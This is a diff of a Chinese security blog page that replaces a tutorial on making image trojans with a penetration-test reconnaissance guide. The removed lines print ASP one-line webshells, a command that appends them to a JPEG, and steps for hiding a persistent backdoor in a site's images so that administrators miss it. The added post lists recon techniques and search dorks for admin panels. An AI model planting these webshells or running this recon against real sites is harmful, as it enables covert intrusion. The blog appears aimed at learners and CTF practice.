@@ -6,24 +6,27 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://black0saturday.github.io">
-  <title>制作图片马 | 一次就好</title>
+  <title>渗透测试-信息收集 | 一次就好</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="前言打CTF遇到需要图片马的题，现学一下如何制作图片马。">
+  <meta name="description" content="前言信息收集是渗透测试中的前曲，也是重中之重，今天就详细总结一下相关的内容。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="制作图片马">
-<meta property="og:url" content="http://black0saturday.github.io/2019/11/20/%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC/index.html">
+<meta property="og:title" content="渗透测试-信息收集">
+<meta property="og:url" content="http://black0saturday.github.io/2018/05/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/index.html">
 <meta property="og:site_name" content="一次就好">
-<meta property="og:description" content="前言打CTF遇到需要图片马的题，现学一下如何制作图片马。">
-<meta property="og:image" content="http://black0saturday.github.io/2019/11/20/%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC/1.png">
-<meta property="og:image" content="http://black0saturday.github.io/2019/11/20/%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC/3.png">
-<meta property="og:image" content="http://black0saturday.github.io/2019/11/20/%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC/2.png">
-<meta property="og:image" content="http://black0saturday.github.io/2019/11/20/%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC/1.jpg">
-<meta property="article:published_time" content="2019-11-20T08:43:18.000Z">
-<meta property="article:modified_time" content="2020-04-06T10:22:18.930Z">
+<meta property="og:description" content="前言信息收集是渗透测试中的前曲，也是重中之重，今天就详细总结一下相关的内容。">
+<meta property="og:image" content="http://black0saturday.github.io/2018/05/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/1.webp">
+<meta property="og:image" content="http://black0saturday.github.io/2018/05/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/2.webp">
+<meta property="og:image" content="http://black0saturday.github.io/2018/05/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/3.webp">
+<meta property="og:image" content="http://black0saturday.github.io/2018/05/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/4.webp">
+<meta property="og:image" content="http://black0saturday.github.io/2018/05/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/5.webp">
+<meta property="og:image" content="http://black0saturday.github.io/2018/05/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/6.webp">
+<meta property="og:image" content="http://black0saturday.github.io/2018/05/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/7.webp">
+<meta property="article:published_time" content="2018-05-15T07:33:58.000Z">
+<meta property="article:modified_time" content="2020-04-08T08:19:11.480Z">
 <meta property="article:author" content="布布f">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://black0saturday.github.io/2019/11/20/%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC/1.png">
+<meta name="twitter:image" content="http://black0saturday.github.io/2018/05/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/1.webp">
   
     <link rel="alternative" href="/atom.xml" title="一次就好" type="application/atom+xml">
   
@@ -175,71 +178,125 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-制作图片马" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-渗透测试-信息收集" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      制作图片马
+      渗透测试-信息收集
     </h1>
   
 
         
-        <a href="/2019/11/20/%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC/" class="archive-article-date">
-  	<time datetime="2019-11-20T08:43:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-20</time>
+        <a href="/2018/05/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="archive-article-date">
+  	<time datetime="2018-05-15T07:33:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-05-15</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>打CTF遇到需要图片马的题，现学一下如何制作图片马。<br><a id="more"></a></p>
-<h2 id="0x01-Copy命令"><a href="#0x01-Copy命令" class="headerlink" title="0x01 Copy命令"></a>0x01 Copy命令</h2><p>先准备两个东西：</p>
-<ul>
-<li>1.asp <code>&lt;%eval request(&quot;value&quot;) %&gt;</code> </li>
-<li>1.jpg 随便一个图片</li>
-</ul>
-<p>打开cmd，输入命令：</p>
-<pre><code>copy 1.jpg/b+1.asp/a 2.jpg
-</code></pre><p><img src="/2019/11/20/%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC/1.png" alt></p>
-<p>然后对比<code>1.png</code>和<code>2.png</code>的源码</p>
-<ul>
-<li><p>1.png<br><img src="/2019/11/20/%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC/3.png" alt="1.png"></p>
-</li>
-<li><p>2.png<br><img src="/2019/11/20/%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC/2.png" alt="2.png"></p>
-</li>
-</ul>
-<p>且<code>2.png</code>可以正常打开，没有影响</p>
-<p>把以下代码放入目标网站，即可按asp执行。</p>
-<pre><code>&lt;% #include files=”2.jpg”%&gt;
-</code></pre><hr>
-<h2 id="0x02-Uedit32"><a href="#0x02-Uedit32" class="headerlink" title="0x02 Uedit32"></a>0x02 Uedit32</h2><p>我们通常在得到webshell之后都想给自己留个后门，等下次或以后有用得到的时候再进来看看。但如果直接加入一句话木马<code>&lt;%execute request(&quot;value&quot;)%&gt;</code>到asp文件中时，在该页面上就会出错</p>
-<p>然后换个思路，使用插入一句话木马的图片做我们的后门。而且我们如果有足够的权限的话（网站中的文件可写），就直接把网站原有的图片变成后门，然后在那个asp文件中加入调用图片后门的代码：<br>    <!--#include file="图片后门地址"--><br>这样就没有上面的“类型不匹配: ‘execute’”错误了，而且也更好的隐藏了我们的后门。</p>
-<p>当我们直接将一句话木马的asp文件改成jpg或gif文件的时候，这个图片文件是打不开的，很容易被管理员发现。换一种方法：制作可以显示图片内容的图片格式后门。</p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>信息收集是渗透测试中的前曲，也是重中之重，今天就详细总结一下相关的内容。</p>
+<hr>
+<a id="more"></a>
+<h3 id="0x01-网站备案号"><a href="#0x01-网站备案号" class="headerlink" title="0x01 网站备案号"></a>0x01 网站备案号</h3><p><strong>1. 何为网站备案号以及为什么收集它？</strong></p>
+<p>备案号是网站是否合法注册经营的标志，一个网站的域名是需要去备案的。上一期我们教大家如何用搜索引擎收集网站的子域名，思路是从主域名下手，延伸下去获取尽可能多的子域名。而一家企业的网站资产中，远远不止有一个主域名，有很多隐藏的主域名我们未能发现，通过查询备案号能够得到更多的信息。</p>
+<p><strong>2. 去哪里收集备案号？</strong><br>查备案号的地址有很多，比如收集百度备案号的地址：</p>
 <ol>
-<li><p>准备工作： </p>
-<ul>
-<li>1.jpg(随便一张图片)</li>
-<li>一句话木马：<code>&lt;%execute request(&quot;value&quot;)%&gt;</code></li>
-<li>Script标签： <code>&lt;script runat=server language=javascript&gt;内容&lt;/script&gt;</code></li>
-<li>调用后门代码：<code>&lt;!-- #include file=&quot;图片地址&quot;--&gt;</code></li>
-<li>工具：UltraEdit</li>
+<li><a href="http://www.beianbeian.com/search/baidu.com" target="_blank" rel="noopener">http://www.beianbeian.com/search/baidu.com</a></li>
+<li><a href="http://www.sojson.com/api/beian/baidu.com" target="_blank" rel="noopener">http://www.sojson.com/api/beian/baidu.com</a></li>
+<li><a href="http://icp.chinaz.com/info?q=baidu.com" target="_blank" rel="noopener">http://icp.chinaz.com/info?q=baidu.com</a></li>
+</ol>
+<p>查到备案号之后可以再进行反查。</p>
+<h3 id="0x02-子域名收集"><a href="#0x02-子域名收集" class="headerlink" title="0x02 子域名收集"></a>0x02 子域名收集</h3><ol>
+<li>子域名枚举/在线子域名枚举扫描：主要是通过工具中的字典，对字典中的二级域名进行轮询查询，从而得出结果，收集到的数据准确性高，但是疏漏洞率也相对较高。</li>
+<li>域传送漏洞：对目标所在的DNS服务器进行漏洞利用，能获取目标所在DNS服务器中的记录，属于很老的漏洞，对于特定的目标几乎很难能找到该漏洞的存在。</li>
+<li>DNS数据集平台：基于全网信息持续收集的平台，根据其收录的信息，以快速查找到需要的数据。<ul>
+<li>DNSdumpster：<a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a></li>
+<li>VirusTotal：<a href="https://www.virustotal.com/#/home/search" target="_blank" rel="noopener">https://www.virustotal.com/#/home/search</a></li>
 </ul>
 </li>
-<li><p>开始制作：<br>使用UltraEdit打开1.jpg文件，找到<code>&lt;%</code>和<code>%&gt;</code> 其中<code>&lt;%</code>的十六进制代码是<code>3E 25</code>,<code>%&gt;</code>的十六进制代码是<code>25 3E</code>，然后把25改成00</p>
-</li>
 </ol>
-<p><img src="/2019/11/20/%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC/1.jpg" alt></p>
-<p>然后将script标签代码<br>    <SCRIPT runat="SERVER" language="JAVASCRIPT">&lt;%execute request(“value”)%&gt;</SCRIPT><br>转换为十六进制，粘贴到1.jpg的十六进制代码的最下面。必须粘贴到最下面，否则就把图片破坏了。<br>最后保存退出，图片后门就做成了。</p>
-<p>注：如果网站的asp网页可以被写入，那将<code>&lt;!--#include file=&quot;1.jpg&quot;--&gt;</code>直接插入到网页中，这样这个网页的url就成了使用菜刀连接的后门地址了；</p>
-<h2 id="0x03-PS插入"><a href="#0x03-PS插入" class="headerlink" title="0x03 PS插入"></a>0x03 PS插入</h2><ol>
-<li>用PS打开一张图片</li>
-<li>点击文件-&gt;文件简介</li>
-<li>然后插入需要的木马代码</li>
-<li>然后保存即可</li>
+<p>另外还有，站长工作和搜索引擎所收录到信息进行查找</p>
+<h3 id="0x03-端口服务收集"><a href="#0x03-端口服务收集" class="headerlink" title="0x03 端口服务收集"></a>0x03 端口服务收集</h3><p>Nmap是安全相关专业人员使用广泛的安全扫描使用之一，它可以检测目标主机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操作系统与设备类型等信息，甚至还能对主机进行漏洞扫描。</p>
+<p>Nmap的端口服务识别的原理是，通过网络发送请求包到服务器中，利用网络的通信请求建立的握手过程(多种方式)进行服务的状态进行判断，服务版本识别主要是通过发送特定的数据包到目标的端口服务中，通过返回的信息进行识别，例如3306(mysql服务)，nmap通过mysql的网络协议通信过程，与mysql建立连接，mysql返回Handshake packet数据包，其中该包中包含mysql版本号信息，nmap从中获取mysql的具体版本信息。</p>
+<p>Nmap教程网上多的是，想学的小伙伴可以自己搜一下</p>
+<h3 id="0x04-C段IP信息收集"><a href="#0x04-C段IP信息收集" class="headerlink" title="0x04 C段IP信息收集"></a>0x04 C段IP信息收集</h3><p>这里的C段指的并非是网络中的C类地址，而是C类地址中子网掩码为255.255.255.0/24中的IP地址段，共254个。对于某些中大型厂商有可能使用的是自建的托管机房，他们的业务通常部署在同一个C类地址子网中，这就给了我们可以利用的空间了。</p>
+<p>就好像家里的路由器一样，当我破解了一个邻居的wifi密码后，接收他的网络，这个时候我就能使用监听工具，对他所发出/接收的数据进行拦截监听，从中获取到相关的账号、密码及信息，当然也有其它的方法和思路可以获取目标服务器的数据或权限。例如：C段中的业务系统与目标服务器的业务系统有关联，使用的是同一个数据库，那么就有可能直接获取到目标服务器的信息了。</p>
+<p>能够查询C段的工具有很多，我最常用的还是nmap。假如我们能够查询到目标网络的C段IP都是开放的。这时候我们就得找一此比较薄弱的IP来重新进行信息收集工作了。</p>
+<h3 id="0x05-旁站信息收集"><a href="#0x05-旁站信息收集" class="headerlink" title="0x05 旁站信息收集"></a>0x05 旁站信息收集</h3><p>旁站指的是，不同的web站点部署在同一台服务器中，在渗透测试的时候，如果目标服务器难以寻找突破点，我们也可以通过旁站入手，寻找弱点，然后再想办法对目标服务器进行跨攻击。例如：通过系统提限、跨目录权限、mysql权限，对目标服务器实施攻击。</p>
+<p>旁站查询主要是通过各大站长平台，基于对以前的收录信息，通过IP进行分组划分，查找其目标的IP来查询相同IP的解释记录而得出的结果，主要的工具有：</p>
+<ol>
+<li><a href="http://dns.aizhan.com" target="_blank" rel="noopener">http://dns.aizhan.com</a></li>
+<li><a href="http://s.tool.chinaz.com/same" target="_blank" rel="noopener">http://s.tool.chinaz.com/same</a></li>
+<li><a href="http://i.links.cn/sameip/" target="_blank" rel="noopener">http://i.links.cn/sameip/</a></li>
+<li><a href="http://www.ip2hosts.com/" target="_blank" rel="noopener">http://www.ip2hosts.com/</a></li>
 </ol>
+<h3 id="0x06-敏感目录-文件收集"><a href="#0x06-敏感目录-文件收集" class="headerlink" title="0x06 敏感目录/文件收集"></a>0x06 敏感目录/文件收集</h3><p>该信息收集方法利用的是基本广大的安全行业从业者对常见web的敏感危险目录/文件形成一个汇总字典，当然也可以结合自己的经验，将文件加入到字典中，增加字典的范围，然后利用该字典向目标web服务器发出请求，显示返回的状态码，然后我们根据状态码进行人工进行判断分析有没有敏感文件可以进行利用。</p>
+<p>响应码判断：</p>
+<ul>
+<li>200代表请求成功</li>
+<li>403|401代表无权限，但文件/目录是存在的</li>
+<li>500代表服务器出错</li>
+<li>其它的响应有状态码请同学们到搜索引擎进行搜索相关知识。</li>
+</ul>
+<p>收集敏感目录/文件的主要工具有：</p>
+<ul>
+<li>DirBuster</li>
+<li>御剑后台</li>
+</ul>
+<h3 id="0x07-IIS短文件名枚举"><a href="#0x07-IIS短文件名枚举" class="headerlink" title="0x07 IIS短文件名枚举"></a>0x07 IIS短文件名枚举</h3><p>此漏洞利用了windows为了对16位MS-DOS程序兼容处理功能来收集信息的。windows为文件名较长的文件（和文件夹）生成了对应的windows 8.3 短文件名，导致攻击者可利用xxx~1字符实施获取长文件名/目录名的信息。当对方的服务器为IIS，不妨可以尝试一下这个漏洞。</p>
+<p>案例：文件名为xxx_login.php的时候，xxx为有特定含义的字符，由于我们所使用的敏感目录/文件收集工具中没有该文件名的字典，所以未能找出该登录后台的地址。此时我们就可以使用IIS短文件名枚举漏洞进行信息收集，得出的结果为xxx_lo~1.php，此时我们就能猜测到这很可能是一个登录页面了。<br><img src="/2018/05/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/1.webp" alt></p>
+<h3 id="0x08-GitHub信息收集"><a href="#0x08-GitHub信息收集" class="headerlink" title="0x08 GitHub信息收集"></a>0x08 GitHub信息收集</h3><p>GitHub是通过Git进行版本控制的软件源代码托管服务平台，当一个项目需要进行协同开发时，就得使用<code>svn</code>或<code>github</code>对代码进行托管及版本控制了。</p>
+<p>GitHub不仅仅是商用的平台，也可以通过该平台对代码进行公开分享并且能获得Star来证明此代码是优秀的。由于此功能的存在，就有可能有部分开发工程师，或者由于公司对代码的管理制度不严谨，造成内部代码公开处理，令攻击者有机可乘。</p>
+<p>案例：某某网站，有部分项目的源代码在github上进行了公开处理，其中，代码中包含敏感的xxx信息，造成重要的信息泄露。</p>
+<p>GitHub信息收集工具：<a href="https://github.com/MiSecurity/x-patrol" target="_blank" rel="noopener">https://github.com/MiSecurity/x-patrol</a><br><img src="/2018/05/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/2.webp" alt></p>
+<h3 id="0x09-网站资产信息探测"><a href="#0x09-网站资产信息探测" class="headerlink" title="0x09 网站资产信息探测"></a>0x09 网站资产信息探测</h3><p>资产信息，这里指的是服务器用的是什么操作系统、中间件、脚本语言、数据库、CMS等等的信息。那么收集到这些信息之后有什么作用呢？比如说目标服务器用的是php语言开发的网站，那么我们就得利用php的一些漏洞去进行渗透了，比如说php的弱类型漏洞等等。如果目标服务器用的是某个cms的源码开发的网站，那么我们就得去查找该cms曾经暴出来的漏洞去进行利用了。</p>
+<p>在这里主要介绍一下CMS指纹识别的原理：是通过请求检查特定的URL或文件是否存在，这个就像sfz的开头的省市都是有特定意义的，每个CMS系统中都存在与众不同的文件或其它信息，这些信息也是由大量前辈汇总而成的，有一些工具只能检测到部分的CMS，因为他们收集的识别信息太少了，CMS指纹识别就是通过这种方式进行检测的。</p>
+<p>以下是我日常中使用到的工具及收集方法：</p>
+<ol>
+<li><a href="http://www.yunsee.cn/info.html" target="_blank" rel="noopener">http://www.yunsee.cn/info.html</a></li>
+<li>查看数据包响应头</li>
+<li>CMS指纹识别：<a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look/</a></li>
+</ol>
+<p>案例：在某次的渗透测试工作中，先是对网站进行资产信息探测试，发现目标网站使用了某个开源的CMS系统，然后通过默认的CMS后台管理地址和默认密码进入后台，再利用该CMS的后台高危漏洞，成功上传一句话木马，成功getshell。<br><img src="/2018/05/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/3.webp" alt></p>
+<p><img src="/2018/05/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/4.webp" alt></p>
+<h3 id="0x10-shodan、fofa、钟馗之眼信息收集"><a href="#0x10-shodan、fofa、钟馗之眼信息收集" class="headerlink" title="0x10 shodan、fofa、钟馗之眼信息收集"></a>0x10 shodan、fofa、钟馗之眼信息收集</h3><p>shodan、fofa、钟馗之眼，他们所提供的功能同样都类似于搜索引擎，都是通过特定的语法去进行信息收集，但与搜索不同的是，web、可见的页面信息进行爬取收录，而他们则是对全网的在线网络设备进行搜索加入其数据库中，例如：各类服务器，数据库，某个系统的端口信息，并提供POC等信息。</p>
+<p>那么我们应该如何使用上述这几个工具呢？对于无指定目标的渗透测试，我们可以将他们当成是一个高级漏洞扫描器来使用，利用他们来获取大量有已知漏洞的主机来进行渗透测试。对于指定目标的渗透测试，我们也可以利用他来做信息收集，此时也需要一定的运气成分，因为他们都是基于全网的搜索，并不一定能够保证收集到网络上的所有机器。</p>
+<h3 id="0x11-寻找真实IP"><a href="#0x11-寻找真实IP" class="headerlink" title="0x11 寻找真实IP"></a>0x11 寻找真实IP</h3><p>为什么要寻找真实IP?，当某个企业使用了CDN/云防线/反向代理等方式对服务进行架构设计时，我们通过ping命令等并不能直接将请求传递到真实的服务器上，而是经过一层设置对该请求进行转向，导致到我们不能获取到真实服务器的开放端口等信息进行收集。</p>
+<p>那么，当我们遇到上述的情况时，我们应该如何才能获取到目标的真实IP呢？下面由我来简述一些比较有趣的方法：</p>
+<p>从子域名入手，一个企业的业务种类繁多，可能只有部分主营业务，访问压力大的域名才使用了CDN，子域名的业务有可能部署在同一台服务器中，或部署在同一个C段中，所以我们就有可能从中找到真实的IP地址。</p>
+<p>历史的DNS平台：<a href="https://dnsdb.io/zh-cn/|" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/|</a> <a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a> 通过平台以前收集到的ip与域名绑定历史记录进行查询。</p>
+<p>邮件原文：通过网站提供的邮件发送功能，如注册时的邮箱验证等，将邮件发送至自己的邮箱中，再查看其邮件原文内容，邮件原文中存在的IP地址有可能就是其真实的IP。</p>
+<p>其它方法在此不一一介绍，有兴趣的同学到搜索引擎去搜索相关的资料吧。</p>
+<p>HTTPS证书查询：工具<a href="https://censys.io/，该工具也是能过全网收集站点的https证书及ip地址，也可以利用该工具进行查找。" target="_blank" rel="noopener">https://censys.io/，该工具也是能过全网收集站点的https证书及ip地址，也可以利用该工具进行查找。</a></p>
+<h3 id="0x12-搜索引擎语法"><a href="#0x12-搜索引擎语法" class="headerlink" title="0x12 搜索引擎语法"></a>0x12 搜索引擎语法</h3><p>主要是利用搜索引擎所收录的数据，通过特定的语法进行搜索，可以达到迅速发现目标弱点的效果。</p>
+<p>利用该方法需要一定的经验积累，以下是针定特定目标的信息收集思路。例如：对于不同的业务系统，得想出不同的联想词，例如商城系统，联想词可以为商家系统，对于大型的企业，OA登录、CRM等等的联想词。</p>
+<ul>
+<li>后台：site:xxx.xxx admin|login|system|管理|登录|内部|系统</li>
+<li>钓鱼：site:xxx.xxx 邮件|email</li>
+<li>社工：site:xxx.xxx qq|群|微信|腾讯</li>
+<li>越权：site:xxx.xxx inurl:uid=1|userid=1</li>
+<li>包含：site:xxx.xxx inurl:php?include=</li>
+</ul>
+<p>还有其它很多很多的方法，在此不在一一列举，有兴趣的同学请找相关的资料来学习。总结一下，对于特定的目标利用该方法去做信息收集，效果并不会特别理想，但对于无指定目标的渗透，将会给我们的渗透工作带来极大的便利，能辅助我们快速找到目标的弱点，进行渗透。</p>
+<h3 id="0x13-爬虫分析"><a href="#0x13-爬虫分析" class="headerlink" title="0x13 爬虫分析"></a>0x13 爬虫分析</h3><p>爬虫分析，是要把整个网站的网页及目录信息结构爬取出来，通过爬取出来的结果去猜测开发工程师的开发思维及逻辑，从中得到某些信息进而利用。</p>
+<p>案例1：通过某个后台，此时已通过某个漏洞进入后台，此时使用爬虫整个后台进行爬虫，其中发现ad/add.php(广告增加)|ad/edit.php(广告编辑)|user/add.php(增加用户)|user/list(会员列表)等等。从中得知开发工程师使用的是有规律、有规范的页面链接命名，那么根据经验，有可能存在admin/add.php等等的页面，有可能存在越权操作漏洞，进而利用。</p>
+<p>案例2：通过爬虫发现，在使用敏感目录/文件进行信息收集时，未发现有危险和可利用的重要信息，但通过爬虫发现了某个重要的后台链接地址，一般来说，开发工程师对于后台的防护较为薄弱，像此类信息也有可能在渗透测试中利用，也需要记录下来。</p>
+<p><img src="/2018/05/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/5.webp" alt></p>
+<h3 id="0x14-AWVS-web弱点扫描"><a href="#0x14-AWVS-web弱点扫描" class="headerlink" title="0x14 AWVS web弱点扫描"></a>0x14 AWVS web弱点扫描</h3><p>Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞，如交叉站点脚本,sql 注入等。在被黑客攻击前扫描购物车，表格、安全区域和其他Web应用程序。75% 的互联网攻击目标是基于Web的应用程序。因为他们时常接触机密数据并且被放置在防火墙之前。</p>
+<p>AWVS如上述所示，主要是通过爬虫来测试你的网站安全，来进行安全漏洞检测，操作及使用方法也相对简单，在此不详细介绍。</p>
+<p>AWVS能检测出的漏洞种类繁多，当然也有可能出现误报的现象，这时就需要我们根据AWVS检测来做难，才能确定漏洞是否存在了。</p>
+<p>AWVS能检测出的漏洞确实很多，我们在短期内也很难完全各种漏洞及原理。不过AWVS官网有一个所有漏洞的列表。同学们可以根据列表的内容去学习自己想要知道的漏洞原理。漏洞列表链接为：<br><a href="https://www.acunetix.com/vulnerabilities/" target="_blank" rel="noopener">https://www.acunetix.com/vulnerabilities/</a></p>
+<p><img src="/2018/05/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/6.webp" alt></p>
+<h3 id="0x15-Nessus-主机弱点扫描"><a href="#0x15-Nessus-主机弱点扫描" class="headerlink" title="0x15 Nessus 主机弱点扫描"></a>0x15 Nessus 主机弱点扫描</h3><p>Nessus 是目前全世界最多人使用的系统漏洞扫描与分析软件。总共有超过75,000个机构使用Nessus 作为扫描该机构电脑系统的软件。，</p>
+<p>Nessus，系统扫描与分析软件，主要针对的是操作系统及操作系统所安装的软件进行漏洞分析，当然也有很多其它附带的功能，例如:web漏洞安全漏洞检测、简单的信息收集。正所谓，专业的人做专业的事，Nessus针对的是操作系统及操作系统所安装的软件进行漏洞分析，因此我们主要的关注点应该在主机漏洞的严重|高|中级别的漏洞，当然Nessus也有误报的情况，这时也需要我们根据其漏洞的编号、信息去进行难。<br><img src="/2018/05/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/7.webp" alt></p>
+<h3 id="0x16-whois信息收集、员工信息、公司名、社工库、云盘搜索"><a href="#0x16-whois信息收集、员工信息、公司名、社工库、云盘搜索" class="headerlink" title="0x16  whois信息收集、员工信息、公司名、社工库、云盘搜索"></a>0x16  whois信息收集、员工信息、公司名、社工库、云盘搜索</h3><p>为什么要将上述几种需要收集的信息放在一起呢？主要是因为以前几种方法针对的通过社工的方法去对目标进行渗透测试。特别需要强调的是云盘搜索，云盘搜索利用原理的是由于企业的管理不善，可能上传了部分的敏感信息资料到云盘中以方便其他员工对需要的资料进行下载，因此我们有可能在这部分的资料中找到一些敏感的信息，从而进行攻击。</p>
+<hr>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在渗透测试中，信息收集是比较枯燥乏味的一项工作任务，但也是一项很重要的工作，所收集的信息能直接影响到下一步的渗透思路及效果，所以一定要有耐心和准备好持续长期地完成这一项工作任务。</p>
+<p>在这个时代中，信息收集的工具种类繁多，各式各样，咱们要不断尝试新的软件跟以前使用过的软件作对比，找到最适合自己的最顺手的工具来使用。</p>
 
       
 
@@ -253,7 +310,7 @@
 				
 				<br>
 				<strong>本文链接：</strong>
-				http://black0saturday.github.io/2019/11/20/%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC/
+				http://black0saturday.github.io/2018/05/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/
 				<br>
 				<strong>版权声明：</strong>
 				本作品采用
@@ -368,7 +425,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://black0saturday.github.io/2019/11/20/%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E9%A9%AC/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://black0saturday.github.io/2018/05/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -382,20 +439,15 @@
   
 <nav id="article-nav">
   
-    <a href="/2020/03/23/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2018/05/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          PHP反序列化
+          区块链基础
         
       </div>
     </a>
   
-  
-    <a href="/2018/11/15/PHP%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">PHP特性总结</div>
-      <i class="icon-circle-right"></i>
-    </a>
   
 </nav>
 
@@ -420,7 +472,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Copy命令"><span class="toc-number">2.</span> <span class="toc-text">0x01 Copy命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Uedit32"><span class="toc-number">3.</span> <span class="toc-text">0x02 Uedit32</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-PS插入"><span class="toc-number">4.</span> <span class="toc-text">0x03 PS插入</span></a></li></ol>
